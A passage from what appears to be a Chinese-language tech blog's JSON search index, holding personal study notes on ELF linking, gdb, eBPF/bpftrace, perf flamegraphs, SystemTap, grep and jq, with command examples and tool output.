binary(relocatable, 又名object file) -\u0026gt; binary(real exe) 把其他object file整理起來 算位置並填上binary去 (relocate) ELF kernel就是從ELF去看或找\n有什麼code 有什麼symbol、要去哪找 大小、長度多少 資料的讀取權限 debug info 類型有\nrelocatable(o) executable shared obj(so) core(core dump) 詳細的可以看這邊\n所以生出exe的過程可以看成改寫ELF的過程\nlinking linking 把很多object file和在一起 確認symbol在不在，處理各個symbol 依據symbol的來源分成兩種 static linking symbol實際定義都在object file中 只要排好給位置就好(relocate) 所以 static lib其實就是把object file黏成一個 如果改code要重算 static加越多，最後出來的exe越大 dynamic linking symbol不在object file中，所以 執行時要往外找 (先找到先用) 等到要load lib時，linker一樣會做relocate，不過與static不同，看PIC 編譯時 有找到就編過 symbol會標上dynamic 所以 編dynamic lib需要特別一點 因為每個proc就算call同一種code，內部addr也會不同 Position-independent Code(PIC)，兩個case code都在同一個檔案 直接算相對位置 需要其他lib linker在載入lib時會填Global Offset Table 裡面會有其他lib的位置，等要call就去查，再跳 可以開心地換lib 大家可以共用 可以在runtime做load!! (dlopen, dlsym, dlerror, dlclose) 實際試試看 compile+assemble main.c，但沒有p1, p2的宣告\nvoid main() { p1(); } gcc -c main.c\nmain.c: In function ‘main’: main.c:4:5: warning: implicit declaration of function ‘p1’ [-Wimplicit-function-declaration] 4 | p1(); | ^~ 把p1補上去\nvoid p1(); void main() { p1(); } static linking a.c\n#include \u0026lt;stdio.h\u0026gt; void p1(){ puts(\u0026#34;static\u0026#34;); } 同樣編成object file gcc -o a.c\n開編 gcc -o main main.o a.o\n如果想模擬一下static lib ar rcs liba.a a.o 編的語法是 gcc -o main -L. -la 其中-L是lib要去哪裡找，-l是lib的名稱\n在linux，lib都是lib\u0026lt;libname\u0026gt;.??\nnm 先用nm看有什麼symbol，有puts與p1\nbee314@DESKTOP-259SCE7:~$ nm main 0000000000003dc8 d _DYNAMIC 0000000000003fb8 d _GLOBAL_OFFSET_TABLE_ 0000000000002000 R _IO_stdin_used w _ITM_deregisterTMCloneTable w _ITM_registerTMCloneTable 0000000000002184 r __FRAME_END__ 0000000000002010 r __GNU_EH_FRAME_HDR 0000000000004010 D __TMC_END__ 0000000000004010 B __bss_start w __cxa_finalize@@GLIBC_2.2.5 0000000000004000 D __data_start 0000000000001100 t __do_global_dtors_aux 0000000000003dc0 d __do_global_dtors_aux_fini_array_entry 0000000000004008 D __dso_handle 0000000000003db8 d __frame_dummy_init_array_entry w __gmon_start__ 0000000000003dc0 d __init_array_end 0000000000003db8 d __init_array_start 00000000000011f0 T __libc_csu_fini 0000000000001180 T __libc_csu_init U __libc_start_main@@GLIBC_2.2.5 0000000000004010 D _edata 0000000000004018 B _end 00000000000011f8 T _fini 0000000000001000 t _init 0000000000001060 T _start 0000000000004010 b completed.8060 0000000000004000 W data_start 0000000000001090 t deregister_tm_clones 0000000000001140 t frame_dummy 0000000000001149 T main 000000000000115e T p1 U puts@@GLIBC_2.2.5 00000000000010c0 t register_tm_clones readelf \u0026amp; objdump 編出來後用objdump與readelf看dynsym，會看到這裡的dynsym是puts\nbee314@DESKTOP-259SCE7:~$ readelf -r main Relocation section \u0026#39;.rela.dyn\u0026#39; at offset 0x520 contains 8 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000003db8 000000000008 R_X86_64_RELATIVE 1140 000000003dc0 000000000008 R_X86_64_RELATIVE 1100 000000004008 000000000008 R_X86_64_RELATIVE 4008 000000003fd8 000100000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTMClone + 0 000000003fe0 000300000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0 000000003fe8 000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 000000003ff0 000500000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCloneTa + 0 000000003ff8 000600000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0 Relocation section \u0026#39;.rela.plt\u0026#39; at offset 0x5e0 contains 1 entry: Offset Info Type Sym. Value Sym. Name + Addend 000000003fd0 000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0 bee314@DESKTOP-259SCE7:~$ objdump -T main main: file format elf64-x86-64 DYNAMIC SYMBOL TABLE: 0000000000000000 w D -UND* 0000000000000000 _ITM_deregisterTMCloneTable 0000000000000000 DF -UND* 0000000000000000 GLIBC_2.2.5 puts 0000000000000000 DF -UND* 0000000000000000 GLIBC_2.2.5 __libc_start_main 0000000000000000 w D -UND* 0000000000000000 __gmon_start__ 0000000000000000 w D -UND* 0000000000000000 _ITM_registerTMCloneTable 0000000000000000 w DF -UND* 0000000000000000 GLIBC_2.2.5 __cxa_finalize ldd 最後用ldd看有連結到那些lib，就是最基本的\nbee314@DESKTOP-259SCE7:~$ ldd main linux-vdso.so.1 (0x00007fffde0c8000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0db9050000) /lib64/ld-linux-x86-64.so.2 (0x00007f0db926d000) dynamic linking b.c\nvoid p1() { puts(\u0026#34;dynamic\u0026#34;); } 編成shared lib gcc -o libb.so -fPIC -shared b.c\n開編 gcc -o main -L. -lb\n之後執行下去\n./main: error while loading shared libraries: libb.so: cannot open shared object file: No such file or directory 這是找不到shared lib，所以\n把libb.so放到預設路徑 加找的路徑 這裡直接幫他加找的路徑 LD_LIBRARY_PATH=. ./main\nnm 用nm看有什麼symbol，少了puts\nbee314@DESKTOP-259SCE7:~$ nm main 0000000000003db8 d _DYNAMIC 0000000000003fb8 d _GLOBAL_OFFSET_TABLE_ 0000000000002000 R _IO_stdin_used w _ITM_deregisterTMCloneTable w _ITM_registerTMCloneTable 000000000000214c r __FRAME_END__ 0000000000002004 r __GNU_EH_FRAME_HDR 0000000000004010 D __TMC_END__ 0000000000004010 B __bss_start w __cxa_finalize@@GLIBC_2.2.5 0000000000004000 D __data_start 0000000000001100 t __do_global_dtors_aux 0000000000003db0 d __do_global_dtors_aux_fini_array_entry 0000000000004008 D __dso_handle 0000000000003da8 d __frame_dummy_init_array_entry w __gmon_start__ 0000000000003db0 d __init_array_end 0000000000003da8 d __init_array_start 00000000000011d0 T __libc_csu_fini 0000000000001160 T __libc_csu_init U __libc_start_main@@GLIBC_2.2.5 0000000000004010 D _edata 0000000000004018 B _end 00000000000011d8 T _fini 0000000000001000 t _init 0000000000001060 T _start 0000000000004010 b completed.8060 0000000000004000 W data_start 0000000000001090 t deregister_tm_clones 0000000000001140 t frame_dummy 0000000000001149 T main U p1 00000000000010c0 t register_tm_clones readelf \u0026amp; objdump 同樣用objdump與readelf看dynsym，這邊只剩下p1，而沒有puts了\nbee314@DESKTOP-259SCE7:~$ readelf -r main Relocation section \u0026#39;.rela.dyn\u0026#39; at offset 0x528 contains 8 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000003da8 000000000008 R_X86_64_RELATIVE 1140 000000003db0 000000000008 R_X86_64_RELATIVE 1100 000000004008 000000000008 R_X86_64_RELATIVE 4008 000000003fd8 000100000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTMClone + 0 000000003fe0 000200000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0 000000003fe8 000300000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 000000003ff0 000500000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCloneTa + 0 000000003ff8 000600000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0 Relocation section \u0026#39;.rela.plt\u0026#39; at offset 0x5e8 contains 1 entry: Offset Info Type Sym. Value Sym. Name + Addend 000000003fd0 000400000007 R_X86_64_JUMP_SLO 0000000000000000 p1 + 0 bee314@DESKTOP-259SCE7:~$ objdump -T main main: file format elf64-x86-64 DYNAMIC SYMBOL TABLE: 0000000000000000 w D -UND* 0000000000000000 _ITM_deregisterTMCloneTable 0000000000000000 DF -UND* 0000000000000000 GLIBC_2.2.5 __libc_start_main 0000000000000000 w D -UND* 0000000000000000 __gmon_start__ 0000000000000000 DF -UND* 0000000000000000 p1 0000000000000000 w D -UND* 0000000000000000 _ITM_registerTMCloneTable 0000000000000000 w DF -UND* 0000000000000000 GLIBC_2.2.5 __cxa_finalize ldd 用ldd看連結到那些lib，多了libb.so，雖然找不到\nbee314@DESKTOP-259SCE7:~$ ldd main linux-vdso.so.1 (0x00007fffc4a8a000) libb.so =\u0026gt; not found libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5a07ce0000) /lib64/ld-linux-x86-64.so.2 (0x00007f5a07efa000) 讓ldd好看一點，把libb.so移到/lib/x86_64-linux-gnu/(抄libc.so.6)\nbee314@DESKTOP-259SCE7:~$ ldd main linux-vdso.so.1 (0x00007fffeb59a000) libb.so =\u0026gt; /lib/x86_64-linux-gnu/libb.so (0x00007fe732bc0000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe7329c0000) /lib64/ld-linux-x86-64.so.2 (0x00007fe732be1000) Ref Dynamic Linking Position-independent Code（PIC）\n","permalink":"https://littlebees.github.io/2021/07/linking%E7%9A%84%E7%A8%AE%E9%A1%9E/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e看bpf時突然想起來，整理一下\u003c/p\u003e","title":"linking的種類"},{"content":"動機 之前不常用記錄一下\nbasic 印 變數val: print(p) {var} 追蹤var(step每次都印): display {var} 變數type: whatis {var} code: list(l) 資訊: info ?? break 下面hook的list threads thread {thread-id}: 換到某個thread去 forks fork {fork-id}: 換到某個proc去 share locals args reg / all-regs 跑: run 離開gdb: quit(q) 設定gdb參數: set {key} {val} kill: kill [sig] 處理gdb收到的sig: handle {sig} nostop noprint ... hook breakpoint(b) 設定: b {addr} or {funcname} or {filename:line-num} 條件成立才設: b {pat} if expr b main.cpp:255 if strA.compare(strB) != 0 watchpoint 設定在??時中斷: 寫: watch {expr} 讀: rwatch {expr} 寫或讀: awatch {expr} catchpoint 中斷一次就好: tcatch {??} 設定在??發生時中斷: catch {??} throw catch exec/fork/vfork load/unload libname 操作hook 啟用/停用: enable / disable 刪br: clear(delete) 繼續跑: continue 先不要跑: ignore {br_id} num 跑到br就做下面的事: commands {br_id} ... end 一行一個指令 command 1 print param2 print param3-\u0026gt;member1 continue end 對stack與function上下其手 stack 現在整個stack: bt 上一層: up [num] 下一層: down 現在這一層: frame [num] 單行執行: step or next 把loop跑完: until 直接return: return 把frame跑完: finish 我就是要跳: jump {addr} or {filename:line-num} reg, addr, signal addr -\u0026gt; val examine(x): x/{COUNT}{FMT}{SIZE} {ADDRESS} FMT: octal(o), hex(h), decimal(d) \u0026hellip; SIZE: byte(b), word(w), giant(g) 看reg: ${reg} handle {SIG} {ACT} SIG: SIGHUP, SIGINT, \u0026hellip; 可以看shell kill -l ACT: 收到SIG時，做什麼，不要就是前面加no(nostop) stop: 程式停下來 print: 印出這個SIG pass: relay SIG到被觀察的程式 (選no就是會sig被擋掉，因為沒有relay過去) core dump 生core dump ulimit -c unlimited cat /proc/sys/kernel/core_pattern echo “1” \u0026gt; /proc/sys/kernel/core_uses_pid # 我不想打proc name man core\n使用core dump gdb {proc-path} {coredump} gdb -c {coredump} 如果有開core_uses_pid script 自訂function: define {func-name} ... end 引入script: source {path} 變數: set ${var} = {val} gdbserver 兩邊準備同一個與source code 之後就可以透過server在client的gdb做除錯\ngdbserver localhost:8888 prog target remote 192.168.81.173:8888 prog 複習asm與debug Assembly And The Art Of Debugging\nreverse debug的範例 假設有一個程式多跑幾次就會seg fault\n讓他在gdb一直跑 b main # main的b b _exit # 最後一行的b command 1 record continue end command 2 run end 爆了，看pc現在指到哪 p $pc # 假設是 (void (*))0x5e4c5d00 p/x $*0x5e4c5d00 # 試著拿值看看，應該是不行 開始往後追 reverse-stepi # 往後 disassemble # 現在在跑什麼，假設發現，是最後的return發生問題 p $sp # (void *) 0x7fffffffdc98 出事的addr watch *(long**)0x7fffffffdc98 # 有人動了就停下來 reverse-continue # 往後，等停下來就是出事的位置 Ref How to get a core dump for a segfault on Linux How to Debug Programs on Remote Server using GDBServer Example Scripting GDB GDB實用教學：自動化你的debug\n","permalink":"https://littlebees.github.io/2021/07/gdb%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前不常用記錄一下\u003c/p\u003e","title":"gdb使用筆記"},{"content":"動機 systemtap看完後就是bpf了\nebpf 放一台vm在kernel中當內線 跑verfier與自己的bytecode 所以會有自己的IR，過llvm轉成bytecode 詳細看BPF Internals (eBPF) 用處 trace, profile, observe, monitor 這裡就與systemtap很像 但是現在bpf的code其實不好上手 bpftrace整體與systemtap很像，但 不能透過probe去找對應的source code 沒有embed c, context var bcc是幫助開發者寫bpf的工具，但 現在在從bcc c/python轉移到libbpf 十分年輕，看commit時間，一年多一點點開始 但libbpf有 BPF CO-RE: bpf的目標，邊一次到處跑 BTF: 進化的DWARF，同時也有bpf的執行檔資訊 libbpf: 很像compiler+linker+bootstraper 生vmlinux.h: 不用裝linux-header了，也不用include了 配合BTF與bpf的ELF設定需要的object與load bpf程式 提供處理kernel版本差異的方法 extern Kconfig: extern u32 CONFIG_HZ __kconfig; struct flavors: 讓relocate時用本機的struct libbpf的寫法十分神奇 security, network 可以鎖syscall，在到network stack之前就過濾封包 bpf程式架構 map 類似mmap, kmap的map，大塊的可以與userspace溝通的記憶體，拿來放一些資料結構 helper bpf不放行直接碰kernel的變數，所以要用這個，當成syscall perf的ring buf bpf把資料傳回userspace的手段 bytecode probe+action how to use 我只想做monitor bcc提供的工具 bpftrace去跑script 我想開發bpf 看完前面兩個，再看libbpf bcc的工具 出事的60秒quick check uptime dmesg -T | tail vmstat 1 mpstat -P ALL 1 pidstat 1 iostat -xz 1 free -m sar -n DEV 1 sar -n TCP,ETCP 1 top 用bcc的工具 execsnoop: 看exec的syscal，會列ret ext4slower: 把file io太慢的proc列出來 biolatency: block io in hist gethostlatency: call getaddrinfo/gethostbyname的延遲，抓DNS延遲 runqlat: scheduler latency in hist biosnoop: 列proc使用block io的狀況，會列latency cachestat: 列cache成功與失敗的比率，每秒一筆 tcpconnect: 列用tcp connect的程式(不用煩惱netstat有沒有裝了) tcpaccept: 列用tcp accept的程式 profile: perf opensnoop: 看open的syscall，會列err 實際上的demo 完整工具列表 bcc github上的工具列表\nbpftrace probe[,probe,...] /filter/ { action; ... } probe用: systemtap用. filter是optional systemtap是用if自己做 probe: 括號是縮寫 BEGID, END dynamic tracing kernel space kprobe(k) kprobe:function_name[+offset] 會有args: arg0, arg1, \u0026hellip; 如果arg都放在stack sarg0, sarg1, \u0026hellip; kretprobe(kr) kretprobe:function_name retval kfunc \u0026amp; kretfunc kfunc:function \u0026amp; kretfunc:function 會有args: args-\u0026gt;name kretfunc會多retval 可以用bpftrace -lv去看有什麼參數與函數 user space uprobe(u) uprobe:library_name:function_name[+offset] uprobe:library_name:address 會有args: arg0, arg1, \u0026hellip; uretprobe(ur) uretprobe:library_name:function_name retval static tracing kernel space tracepoint(t) tracepoint:name user space usdt(U) usdt:binary_path:probe_name usdt:binary_path:[probe_namespace]:probe_name usdt:library_path:probe_name usdt:library_path:[probe_namespace]:probe_name else profile(p): perf的抽樣 profile:hz:rate 單位: hz, s, ms, us rate: 次數 software(s): perf的software事件 man perf_event_open software:event_name:count or software:event_name event cpu-clock(cpu) task-clock page-faults(faults) context-switches(cs) cpu-migrations minor-faults major-faults alignment-faults emulation-faults dummy bpf-output hardware(h): perf的hardware事件 man perf_event_open hardware:event_name:count or hardware:event_name event cpu-cycles(cycles) instructions cache-references cache-misses branch-instructions(branchs) branch-misses bus-cycles frontend-stalls backend-stalls ref-cycles interval(i): timer interval:ms:rate 單位: hz, s, ms, us rate: 次數 可以在某些probe用wildcard，k:vfs_* 還有看mem與probe的iterator在這裡 action buildin function printf signal \u0026hellip; 直接看這裡 map function 語法真的很神奇 @name = map-function(val) 我是這樣想: @name = map-function(@name, val) map function會去讀map與val產生新的map count hist min, max 剩下這裡 buildin var pid, tid, uid, gid, cpid(child pid) kstack, ustack: kernel, user stack $1,$2\u0026hellip;: bpftrace的參數 rand: 就是rand cpu, cgroup: cpu id, cgroup id comm: proc name func: function name probe: probe name nssec, elapsed: timestamp in ns, bpftrace的運行時間 controll structrue if (expr) {} else {} (expr) ? expr1 : expr2; unroll (expr) {} (loop) comment: //, /**/ var local: $name global: @name 這個其實就是map，拿來放置大物件的 buildin: name 沒有struct? 自己寫 include(同c) 生BTF cast(同c) data structrue array(hash) @associative_array_name[key_name, key_name2, ...] tuple $t = (expr1, expr2, ...) $t.1; $t.2; libbpf 參考資料在? 範例在兩個地方\nlibbpf-bootstrap bcc的libbpf-tools 有說明文\nBCC to libbpf conversion guide 雖說是BCC到libbpf，但裡面涵蓋寫libbpf需要注意的點 Tips and Tricks for Writing Linux BPF Applications with libbpf 誠如標題所示，就是tip與trick Building BPF applications with libbpf-bootstrap libbpf-bootstrap講解 主角，libbpf的code，在這裡\n建議從libbpf-bootstrap開始看，下面用examples/c/krpobe來看，看看每個用libbpf都會有的東西\n兩個code: userspace \u0026amp; bpf 現在程式分成userspace的kprobe.c與bpf的kprobe.bpf.c\nkprobe.c: 會做跑bpf的前置工作與等bpf完成 kprobe.bpf.c: 實際跑bpf probe的地方\nuserspace header有#include \u0026quot;kprobe.skel.h\u0026quot; libbpf生的header，裡面有與bpf溝通需要的東西與libbpf的API\nlibbpf_print_fn 與 bump_memlock_rlimit libbpf_print_fn就是printk之類的，可以在裡面設定需要多燒level才print\nbump_memlock_rlimit是設定bpf的mem用量\n載入到執行到移除 bootstrap_bpf__open 把bpf的code讀進來 拿到struct bootstrap_bpf 可以改裡面的參數 bootstrap_bpf__load 開始創map，把code丟到verifier bootstrap_bpf__attach 開始跑 之後就是看userspace要做什麼 bootstrap_bpf__destroy 把bpf停掉 bpf herder #include \u0026#34;vmlinux.h\u0026#34; /* all kernel types */ #include \u0026lt;bpf/bpf_helpers.h\u0026gt; /* most used helpers: SEC, __always_inline, etc */ #include \u0026lt;bpf/bpf_core_read.h\u0026gt; /* for BPF CO-RE helpers */ #include \u0026lt;bpf/bpf_tracing.h\u0026gt; /* for getting kprobe arguments */ map struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 8192); __type(key, pid_t); __type(value, u64); } exec_start SEC(\u0026#34;.maps\u0026#34;); 有關的type在bpf.h 但struct要放什麼就要去找範例了 要加SEC(\u0026quot;.maps\u0026quot;) probe SEC(\u0026#34;tp/sched/sched_process_exec\u0026#34;) int handle_exec(struct trace_event_raw_sched_process_exec *ctx) { //... return 0; } 在SEC放probe 不同probe的函數宣告方式不一樣，像kprobe要BPF_KPROBE(...)這macro 找範例去對，現在還沒看到像樣的文件 helper task = (struct task_struct *)bpf_get_current_task(); bpf_get_current_comm(\u0026amp;e-\u0026gt;comm, sizeof(e-\u0026gt;comm)); bpf_probe_read_str(\u0026amp;e-\u0026gt;filename, sizeof(e-\u0026gt;filename), (void *)ctx + fname_off); 這些helper都在bpf_helper_defs.h\nRef bpftrace Cheat Sheet bpftrace Reference Guide BPF binaries: BTF, CO-RE, and the future of BPF perf tools BPF Internals (eBPF) BPF Portability and CO-RE\n","permalink":"https://littlebees.github.io/2021/07/bpf%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003esystemtap看完後就是bpf了\u003c/p\u003e","title":"bpf使用筆記"},{"content":"動機 perf perf是linux2.6之後就內建的工具，可以對cpu採樣\nperf會對cpu抽樣，去看現在cpu上的proc是什麼 perf record -F \u0026lt;how-many-times-should-perf-probe\u0026gt; -e \u0026lt;which-event-want-to-trace\u0026gt; -p \u0026lt;pid\u0026gt; -g -- sleep \u0026lt;how-long-does-perf-keep-profiling\u0026gt;\n在linux上採樣還有ebpf可以用，但是最好是在4.10之後的版本用\n之後透過其他工具整理成flamegraph\nflamegraph x軸 沒有什麼意義，因為重點是stack 但chrome的devtools是時間，所以會變成現在這時間點上有什麼stack y軸 stack的深度 最上面就是正在跑的function 從底往上長 顏色 沒有什麼意義 但也可以讓他表示不同的東西，分別用不同的顏色 來源: jvm, c++, kernel\u0026hellip; cycle/inst的比重: 看是cycle多(stall)，或是都在跑inst 點 =\u0026gt; 長方形 就是function在stack中的佔比 所以可以換perf的事件，看在stack中發生的佔比!! 除了追花費時間 cxt switch 找blocked proc page fault 找誰在要mem disk io req 找用disk的 cpu + off-cpu cpu就是原本誰在跑的flamegraph off-cpu就是看誰睡著的flamegraph ebpf可以把兩個和在一起，看 睡著的理由 睡覺時誰在做事 還可以追tcp event, CPU cache miss(LLC-loads) 常見問題 一般profiler都透過下面兩個東西去走\nstack pointer frame(或DWARF) symbol table stack frame pointer compiler優化會把frame ptr當成一般來用 解法 關掉 改用DWARF 用JIT runtime walker? 這樣看不到kernel inline stack frame會消失 解法 關掉 別，很可怕 限制inline的size (java可以，C能嗎?) runtime支援可選的un-inline (java可以，C能嗎?) perf的stack depth限制 預設127 linux4.8之後可以改 debug symbol 沒symbol就傻眼 解法 找有dbgsym的同名package裝 自己編有debug symbol的 注意到優化等級，有時候優化會把symbol丟了 可以用針對debug的優化，-Og JIT要由runtime生(java的perf-map-agent) code跑在container上 進不去怎麼perf 解法 copy出來需要的東西出來 linux4.13的improve Ref Brendan Gregg大大的slide 十分明瞭一定要看 Brendan Gregg的flamegraphs blog有實例\n","permalink":"https://littlebees.github.io/2021/06/flamegraph%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"flamegraph筆記"},{"content":"動機 受不了只能一直放printf與printk來猜到底哪裡錯的日子，所以來看看systemtap 發現他真的很強!!\nsystemtap probe\nscript -\u0026gt; C -\u0026gt; kernel module 基本就是probe \u0026lt;event\u0026gt; { \u0026lt;handler\u0026gt; } event: what-to-traced-type.suffix1.suffix2.... 起點與終點 begin end error 同步 kernel \u0026amp; module(mpat) \u0026amp; process(pmat) \u0026amp; syscall mpat: 放lib的名字，支援*,[],?等wildcard pmat: pid | \u0026quot;path-to-proc\u0026quot; process還可以 thread: 看生出來的thread begin end 接下面的function, statement syscall的用法: syscall(num) 或 syscall.name 或 syscall.* syscall提供4個變數: argstr, name, retvat, retstr function(pat) : 函數 pat: function-name[@source-path[{:line-number|:first-line-last-line|+relative-line-number}]] | * exported callee callees statement(pat) : 其中的code nearest 可以指定觸發的時機 call return inline 省略就是 call+inline 在handler中可以看source code中的變數(context(target) variable) $var @var(“varname@src/file.c”) 這個能access到extern或是不在scope中的變數 deref $var-\u0026gt;a $var[0] check cxt var exists @defined(expr) pretty-print $$var print struct $var$ nested: $var$$ cast (如果struct在不同地方) @cast(tv, “timeval”, “\u0026lt;sys/time.h\u0026gt;”)-\u0026gt;tvsec tmp = \u0026amp;@cast(tv, “timeval”, “\u0026lt;sys/time.h\u0026gt;”)[0]; tmp-\u0026gt;tvsec 沒有DWARF(debug訊息) kprobe module(mpat) funtion \u0026amp; statement function與module不能用wildcard nd_syscall 異步 timer ms jiffies profile 週期性的在每顆cpu上發作 略過 procfs: 在systemtap的/proc/systemtap/mod-name/中創檔案 java: 能看java input: 能吃stdin netfilter: 看netfilter perf: 看perf event python: 看python 還有硬體追蹤的功能，去man stapprobes看看吧 handler function: buildin tid, pid execname: 現在跑的proc name cpu: cpuid gettimeofday_s pp: probe目前的位置(配合pat有wildcard時可以印code檔名與行數與函數名) ppfunc: 被probe的func name print_backtrace: kernel stack print_ubacktrace: userspace stack thread_indent: 會根據stack深度噴indent exit 所有builtin 自訂 function func_name(var, ...) {} embedded c function func_name(var:type, ...):type %{ ... %} 如果要取systemtap的變數要 參數: STAP_ARG_varname 全域: STAP_GLOBAL_GET_varname() 怎麼set 一般: STAP_GLOBAL_SET_varname(val) array: STAP_GLOBAL_SET_varname(key1,...,val) c的code要加 /* pragma:read:varname */ /* pragma:write:varname */ return時要注意，使用特別語法 STAP_RETURN(expr) STAP_RETVALUE = expr 目前看到的type 數字: long 字串: string controll structrue if (expr) ... else ... while (expr) ... for (A;B;C) ... comment: #, //, /**/ str concan: strA . strB var type: numder, string var = expr scope: block, global global will be auto lock\u0026amp;unlock global: global \u0026lt;name\u0026gt; data structrue array: 其實是hash，只能global foreach (VALUE = [KEY1, KEY2, …] in ARRAY) STMT delete array[KEY1, KEY2, …] if ([KEY1, KEY2, …] in array) ... aggregate: 這是set\u0026lt;int\u0026gt;，只能用systemtap提供的函數來操作 append: a \u0026lt;\u0026lt;\u0026lt; \u0026lt;number\u0026gt; @avg(a) @count(a) @hist_linear @hist_log example: probe kernel.function(\u0026quot;*@net/socket.c\u0026quot;) { } man stapex systemtap\u0026rsquo;s module: tapset 與CSS一樣，後面會override前面 Probe point aliases probe的wrapper，或是叫decorator，用python的話來說 probe name.suffix = probe, probe.... { .. } 後面就是把name.suffix當成一般的probe，但會先跑handler他handler的東西 stap 參數 -l PROBE: List matching probes. -L PROBE: List matching probes and local variables. 據說可以用這個追函數的實際地點(像用wildcard會把所有相關的列出來) 但我在我ubuntuVM上都出不來啊 還有ubuntu 20.04上的systemtap不能從apt裝，動不了 -g: guru mode(如果要用embed c的話) all man Ref 短短的tutorial 讚 其他大大的筆記 systemtap的使用技巧 感覺值得深入去看\n","permalink":"https://littlebees.github.io/2021/06/systemtap%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e受不了只能一直放printf與printk來猜到底哪裡錯的日子，所以來看看systemtap\n發現他真的很強!!\u003c/p\u003e","title":"systemtap使用筆記"},{"content":"動機 整理常用的grep\nmatch 一般都是用regex去match一部分的字\npat當成字串: grep -F 可以當成notepad的Ctrl+F regex不想加backslash: egrep 忽略大小寫: grep -i 整行要match: grep -x,--line-regexp 只match看單字: grep -w, --word-regexp 像pat給test testfrd不會match ,test\u0026rsquo;會match，因為有符號隔開 show 前i行，後j行都要看: grep -A i -B j 前後各k行: grep -C k 只印沒match的: grep -v 印行號: grep -n 印檔名: grep -H 不印: -h 不要印任何東西: grep -q 通常用在if作條件判斷的時候 search 不要match binary: grep -I 找所有資料夾的所有檔案: grep -r -R也是遞迴，但會follow symbol link 找code在哪個檔案: grep -Irn stream 如果對面是stream: grep --line-buffered 像是log有很多東西混在一起的話 tail -f /var/log/some.log | grep --line-buffered \u0026quot;srv-name\u0026quot; ","permalink":"https://littlebees.github.io/2021/06/grep%E5%B8%B8%E7%94%A8%E6%95%B4%E7%90%86/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e整理常用的grep\u003c/p\u003e","title":"grep常用整理"},{"content":"動機 在bash想處理json的好工具\nbasic .就是目前的input .\u0026lt;name\u0026gt;會取對應key的value {obj}[0]這是取array的第零項 {obj}[i:j]這是slice第i項到第j-1項的array {obj}[]會iterate所有項目 array就是每個item obj就是無視key，把每個value走過一次 [\u0026lt;expr\u0026gt;] {\u0026lt;expr\u0026gt;}分別做出array與json object \u0026lt;expr0\u0026gt; | \u0026lt;expr\u0026gt; as $var | \u0026lt;expr2\u0026gt;設定$var成\u0026lt;expr\u0026gt;的值，pipe後面的點是\u0026lt;expr0\u0026gt;的值 例子 假設我們想把\n[ { \u0026#34;name\u0026#34;:\u0026#34;Test Value\u0026#34;, \u0026#34;timer\u0026#34;:[ { \u0026#34;datetime\u0026#34;:\u0026#34;08/30/2017 16:33:35\u0026#34;, \u0026#34;value\u0026#34;:\u0026#34;625\u0026#34; }, { \u0026#34;datetime\u0026#34;:\u0026#34;08/30/2017 16:22:38\u0026#34;, \u0026#34;value\u0026#34;:\u0026#34;240\u0026#34; } ] }, { \u0026#34;name\u0026#34;:\u0026#34;Test Value 2\u0026#34;, \u0026#34;timer\u0026#34;:[ { \u0026#34;datetime\u0026#34;:\u0026#34;08/30/2017 16:07:38\u0026#34;, \u0026#34;value\u0026#34;:\u0026#34;432\u0026#34; }, { \u0026#34;datetime\u0026#34;:\u0026#34;08/30/2017 15:59:07\u0026#34;, \u0026#34;value\u0026#34;:\u0026#34;1355\u0026#34; } ] } ] 變成\n[ [ \u0026#34;Test Value\u0026#34;, \u0026#34;08/30/2017 16:33:35\u0026#34; ], [ \u0026#34;Test Value\u0026#34;, \u0026#34;08/30/2017 16:22:38\u0026#34; ] ] [ [ \u0026#34;Test Value 2\u0026#34;, \u0026#34;08/30/2017 16:07:38\u0026#34; ], [ \u0026#34;Test Value 2\u0026#34;, \u0026#34;08/30/2017 15:59:07\u0026#34; ] ] 所以要做的是\n拿name iterate每個timer去拿datetime datetime與name組在一起 下面一步一步的code\n.[] 先走每個值 .[] | .name as $name 取name .[] | .name as $name | .timer[] 取timer走每個值 .[] | .name as $name | .timer[] | .datetime 取timer走每個值 .[] | .name as $name | .timer[] | [$name, .datetime] 把tiemr與datetime合起來 .[] | .name as $name | [.timer[] | [$name, .datetime]] 最後把timer的loop包起來 這個例子因為把不同level的資料和在一起，所以要變數把不同level的東西存好 才有辦法在後面需要時去用\n所以怎麼看jq的咒語?\n順著原本的json架構去看 分pipe去看現在的.是誰 遇到建構array或obj的部分要對好原本json的位置去看裡面是在建構什麼 faltten 如果要把\n[ [ \u0026#34;Test Value\u0026#34;, \u0026#34;08/30/2017 16:33:35\u0026#34; ], [ \u0026#34;Test Value\u0026#34;, \u0026#34;08/30/2017 16:22:38\u0026#34; ] ] [ [ 